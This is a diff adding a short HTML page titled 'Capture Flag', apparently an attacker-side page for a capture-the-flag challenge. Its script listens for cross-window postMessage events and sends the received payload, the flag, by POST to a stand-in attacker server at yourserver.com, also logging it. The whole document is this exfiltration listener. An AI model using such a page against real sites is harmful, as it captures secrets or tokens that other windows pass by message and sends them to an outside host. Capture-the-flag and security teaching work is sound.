@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Capture Flag</title>
+</head>
+<body>
+  <script>
+    window.addEventListener('message', (event) => {
+      if (event.data.type === 'create') {
+        // Send the flag to your server or log it
+        fetch('https://yourserver.com/save', {
+          method: 'POST',
+          body: JSON.stringify({ flag: event.data.payload }),
+          headers: { 'Content-Type': 'application/json' }
+        });
+        console.log('Flag:', event.data.payload);
+      }
+    });
+  </script>
+</body>
+</html>
